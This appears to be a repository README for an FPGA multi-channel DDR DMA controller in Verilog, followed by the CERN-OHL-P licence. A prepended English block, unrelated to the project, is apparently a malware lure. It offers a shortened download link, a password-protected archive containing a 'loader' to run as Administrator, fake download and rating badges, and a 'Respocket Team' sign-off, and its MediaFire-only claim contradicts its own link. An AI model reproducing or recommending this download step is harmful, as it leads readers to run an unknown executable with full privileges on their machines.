<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://cutxo.com/cguqla">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# Multi-channel DDR DMA Controller (FPGA RTL)

一个面向 FPGA DDR 数据通路的多通道 Verilog 控制器，提供视频流与普通
AXI-Stream 数据在多个写通道、读通道之间的缓存、地址生成和固定优先级仲裁。

> **开源许可证：CERN-OHL-P-2.0；Copyright © 2026 Xiao Jun。**
>
> `uiFDMA.v` 是外部第三方依赖，不随本仓库分发；详见
## 功能概览

- 4 路写通道：W0/W3 为视频帧通道，W1/W2 为普通流式 DMA 通道。
- 5 路读通道：R0/R1 为视频帧通道，R2/R3/R4 为普通流式 DMA 通道。
- 每个通道可通过参数独立启用或关闭。
- 支持异步 FIFO 跨时钟域。
- 支持窄位宽输入流打包到 DDR/AXI 数据宽度。
- 视频通道支持帧缓冲索引、行/帧地址推进和同步控制。
- 普通 DMA 通道支持运行时基地址、文件大小和启动控制。
- 控制器采用固定优先级仲裁，并通过 FDMA 请求接口驱动 AXI4 master bridge。
## 当前固定优先级

```text
W0 -> R0 -> R1 -> W1 -> W2 -> W3 -> R2 -> R3 -> R4
```

该顺序来自 `DMA4DDR_ctrl_v1.v` 当前仲裁状态机；如用于持续高负载场景，建议
评估低优先级通道的饥饿风险。

## 目录

```text
rtl/
  DMA4DDR_ctrl_v1.v   顶层：通道配置、复用、地址生成和仲裁
  WFIFO_VIDEO.v       视频写通道
  WFIFOdma_v1.v       普通流式写通道
  RFIFO_VIDEO.v       视频读通道
  RFIFOdma_v1.v       普通流式读通道
  sfifo.v             异步 FIFO / 位宽转换基础模块
  dma_stream_packer.v 窄流到宽拍打包器
scripts/
  lint.ps1            Icarus Verilog 编译检查
vendor/
  uiFDMA.v            本地外部依赖；被 .gitignore 排除
```

## 工具与语言

- Verilog/SystemVerilog-2012 编译模式
- 已使用 Icarus Verilog 做顶层 elaboration 检查
- 目标集成环境为带 AXI4 DDR/MIG 用户接口的 FPGA 系统

## 快速检查

1. 按授权条件自行取得兼容的 `uiFDMA.v`。
2. 将其放入 `vendor/uiFDMA.v`。
3. 在 PowerShell 中运行：

```powershell
./scripts/lint.ps1
```

也可以显式指定外部文件：

```powershell
./scripts/lint.ps1 -UiFdmaPath 'D:\path\to\authorized\uiFDMA.v'
```

## 已知事项

- 当前仲裁为固定优先级，不是 round-robin。
- 当前版本尚未附带公开 testbench；建议后续补充读写、背压、跨时钟域和
  多通道竞争测试。
- 发布副本修正了原顶层中 R0/R1 两个 `I_R0sync_en` 悬空连接；原工程文件未改动。
- `uiFDMA` 不属于本仓库可再许可的源码范围。

## License

本仓库中可公开的 Covered Source 由 Xiao Jun 以


---

CERN Open Hardware Licence Version 2 - Permissive


Preamble

CERN has developed this licence to promote collaboration among
hardware designers and to provide a legal tool which supports the
freedom to use, study, modify, share and distribute hardware designs
and products based on those designs. Version 2 of the CERN Open
Hardware Licence comes in three variants: this licence, CERN-OHL-P
(permissive); and two reciprocal licences: CERN-OHL-W (weakly
reciprocal) and CERN-OHL-S (strongly reciprocal).

The CERN-OHL-P is copyright CERN 2020. Anyone is welcome to use it, in
unmodified form only.

Use of this Licence does not imply any endorsement by CERN of any
Licensor or their designs nor does it imply any involvement by CERN in
their development.


1 Definitions

  1.1 'Licence' means this CERN-OHL-P.

  1.2 'Source' means information such as design materials or digital
      code which can be applied to Make or test a Product or to
      prepare a Product for use, Conveyance or sale, regardless of its
      medium or how it is expressed. It may include Notices.

  1.3 'Covered Source' means Source that is explicitly made available
      under this Licence.

  1.4 'Product' means any device, component, work or physical object,
      whether in finished or intermediate form, arising from the use,
      application or processing of Covered Source.

  1.5 'Make' means to create or configure something, whether by
      manufacture, assembly, compiling, loading or applying Covered
      Source or another Product or otherwise.

  1.6 'Notice' means copyright, acknowledgement and trademark notices,
      references to the location of any Notices, modification notices
      (subsection 3.3(b)) and all notices that refer to this Licence
      and to the disclaimer of warranties that are included in the
      Covered Source.

  1.7 'Licensee' or 'You' means any person exercising rights under
      this Licence.

  1.8 'Licensor' means a person who creates Source or modifies Covered
      Source and subsequently Conveys the resulting Covered Source
      under the terms and conditions of this Licence. A person may be
      a Licensee and a Licensor at the same time.

  1.9 'Convey' means to communicate to the public or distribute.


2 Applicability

  2.1 This Licence governs the use, copying, modification, Conveying
      of Covered Source and Products, and the Making of Products. By
      exercising any right granted under this Licence, You irrevocably
      accept these terms and conditions.

  2.2 This Licence is granted by the Licensor directly to You, and
      shall apply worldwide and without limitation in time.

  2.3 You shall not attempt to restrict by contract or otherwise the
      rights granted under this Licence to other Licensees.

  2.4 This Licence is not intended to restrict fair use, fair dealing,
      or any other similar right.


3 Copying, Modifying and Conveying Covered Source

  3.1 You may copy and Convey verbatim copies of Covered Source, in
      any medium, provided You retain all Notices.

  3.2 You may modify Covered Source, other than Notices.

      You may only delete Notices if they are no longer applicable to
      the corresponding Covered Source as modified by You and You may
      add additional Notices applicable to Your modifications.

  3.3 You may Convey modified Covered Source (with the effect that You
      shall also become a Licensor) provided that You:

       a) retain Notices as required in subsection 3.2; and

       b) add a Notice to the modified Covered Source stating that You
          have modified it, with the date and brief description of how
          You have modified it.

  3.4 You may Convey Covered Source or modified Covered Source under
      licence terms which differ from the terms of this Licence
      provided that You:

       a) comply at all times with subsection 3.3; and

       b) provide a copy of this Licence to anyone to whom You
          Convey Covered Source or modified Covered Source.


4 Making and Conveying Products

You may Make Products, and/or Convey them, provided that You ensure
that the recipient of the Product has access to any Notices applicable
to the Product.


5 DISCLAIMER AND LIABILITY

  5.1 DISCLAIMER OF WARRANTY -- The Covered Source and any Products
      are provided 'as is' and any express or implied warranties,
      including, but not limited to, implied warranties of
      merchantability, of satisfactory quality, non-infringement of
      third party rights, and fitness for a particular purpose or use
      are disclaimed in respect of any Source or Product to the
      maximum extent permitted by law. The Licensor makes no
      representation that any Source or Product does not or will not
      infringe any patent, copyright, trade secret or other
      proprietary right. The entire risk as to the use, quality, and
      performance of any Source or Product shall be with You and not
      the Licensor. This disclaimer of warranty is an essential part
      of this Licence and a condition for the grant of any rights
      granted under this Licence.

  5.2 EXCLUSION AND LIMITATION OF LIABILITY -- The Licensor shall, to
      the maximum extent permitted by law, have no liability for
      direct, indirect, special, incidental, consequential, exemplary,
      punitive or other damages of any character including, without
      limitation, procurement of substitute goods or services, loss of
      use, data or profits, or business interruption, however caused
      and on any theory of contract, warranty, tort (including
      negligence), product liability or otherwise, arising in any way
      in relation to the Covered Source, modified Covered Source
      and/or the Making or Conveyance of a Product, even if advised of
      the possibility of such damages, and You shall hold the
      Licensor(s) free and harmless from any liability, costs,
      damages, fees and expenses, including claims by third parties,
      in relation to such use.


6 Patents

  6.1 Subject to the terms and conditions of this Licence, each
      Licensor hereby grants to You a perpetual, worldwide,
      non-exclusive, no-charge, royalty-free, irrevocable (except as
      stated in this section 6, or where terminated by the Licensor
      for cause) patent licence to Make, have Made, use, offer to
      sell, sell, import, and otherwise transfer the Covered Source
      and Products, where such licence applies only to those patent
      claims licensable by such Licensor that are necessarily
      infringed by exercising rights under the Covered Source as
      Conveyed by that Licensor.

  6.2 If You institute patent litigation against any entity (including
      a cross-claim or counterclaim in a lawsuit) alleging that the
      Covered Source or a Product constitutes direct or contributory
      patent infringement, or You seek any declaration that a patent
      licensed to You under this Licence is invalid or unenforceable
      then any rights granted to You under this Licence shall
      terminate as of the date such process is initiated.


7 General

  7.1 If any provisions of this Licence are or subsequently become
      invalid or unenforceable for any reason, the remaining
      provisions shall remain effective.

  7.2 You shall not use any of the name (including acronyms and
      abbreviations), image, or logo by which the Licensor or CERN is
      known, except where needed to comply with section 3, or where
      the use is otherwise allowed by law. Any such permitted use
      shall be factual and shall not be made so as to suggest any kind
      of endorsement or implication of involvement by the Licensor or
      its personnel.

  7.3 CERN may publish updated versions and variants of this Licence
      which it considers to be in the spirit of this version, but may
      differ in detail to address new problems or concerns. New
      versions will be published with a unique version number and a
      variant identifier specifying the variant. If the Licensor has
      specified that a given variant applies to the Covered Source
      without specifying a version, You may treat that Covered Source
      as being released under any version of the CERN-OHL with that
      variant. If no variant is specified, the Covered Source shall be
      treated as being released under CERN-OHL-S. The Licensor may
      also specify that the Covered Source is subject to a specific
      version of the CERN-OHL or any later version in which case You
      may apply this or any later version of CERN-OHL with the same
      variant identifier published by CERN.

  7.4 This Licence shall not be enforceable except by a Licensor
      acting as such, and third party beneficiary rights are
      specifically excluded.
